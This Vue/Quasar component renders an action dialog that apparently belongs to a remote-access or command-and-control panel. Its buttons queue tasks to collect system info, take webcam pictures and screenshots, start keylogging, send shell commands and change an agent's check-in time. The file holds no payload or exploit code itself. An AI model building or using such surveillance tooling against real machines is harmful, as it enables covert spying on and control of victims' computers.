<script setup>
import { useBackendStore } from "../stores/backend";
import { useQuasar } from "quasar";

const $q = useQuasar();

const backendStore = useBackendStore();

function closeDialog() {
  backendStore.isActionsDialogVisible = false;
}

function openTerminal() {
  backendStore.isTerminalVisible = true;
  backendStore.isActionsDialogVisible = false;
}

function executeTask(task, value) {
  let result = backendStore.addTask(task, value);

  backendStore.isActionsDialogVisible = false;

  if (result) {
    $q.notify({
      message: "Task send successfully. You can check status in tasks page.",
      color: "green",
      position: "top",
    });
  } else {
    $q.notify({
      message: "Something went wrong. Please try again later.",
      color: "red",
      position: "top",
    });
  }
}

function openCheckInDialog() {
  backendStore.isActionsDialogVisible = false;
  backendStore.isCheckInDialogVisible = true;
}
</script>
<template>
  <q-dialog v-model="backendStore.isActionsDialogVisible" persistent>
    <q-card>
      <q-bar>
        <q-icon name="visibility" />

        <div>{{ backendStore.actionDialogBarInfo }}</div>

        <q-space />

        <q-btn dense flat icon="close" @click="closeDialog">
          <q-tooltip>Close</q-tooltip>
        </q-btn>
      </q-bar>

      <q-card-section>
        <q-btn
          color="primary"
          icon="info"
          stack
          class="setWidth"
          rounded
          @click="executeTask('get_info', '')"
          >Get info
        </q-btn>
      </q-card-section>

      <q-card-section class="q-pt-none">
        <q-btn
          color="primary"
          icon="photo_camera"
          stack
          class="setWidth"
          rounded
          @click="executeTask('take_picture', '')"
          >Take a picture</q-btn
        >
      </q-card-section>

      <q-card-section class="q-pt-none">
        <q-btn
          color="primary"
          icon="screenshot_monitor"
          stack
          class="setWidth"
          rounded
          @click="executeTask('take_screenshot', '')"
          >Take a screenshot
        </q-btn>
      </q-card-section>

      <q-card-section class="q-pt-none">
        <q-btn color="primary" icon="keyboard" stack class="setWidth" rounded
          >Start keylogging</q-btn
        >
      </q-card-section>

      <q-card-section class="q-pt-none">
        <q-btn color="primary" class="setWidth" rounded @click="openTerminal">
          <div class="column items-center">
            <q-avatar size="26px">
              <img
                src="https://symbols.getvecta.com/stencil_75/34_bash-shell-icon.a56a03e1f5.png"
                alt=""
              />
            </q-avatar>

            <br />

            <div class="text-center">Send commands</div>
          </div>
        </q-btn>
      </q-card-section>

      <q-card-section class="q-pt-none">
        <q-btn
          color="primary"
          icon="settings"
          stack
          class="setWidth"
          rounded
          @click="openCheckInDialog"
          >Change check in time</q-btn
        >
      </q-card-section>
    </q-card>
  </q-dialog>
</template>

<style>
.setWidth {
  width: 100%;
}
</style>
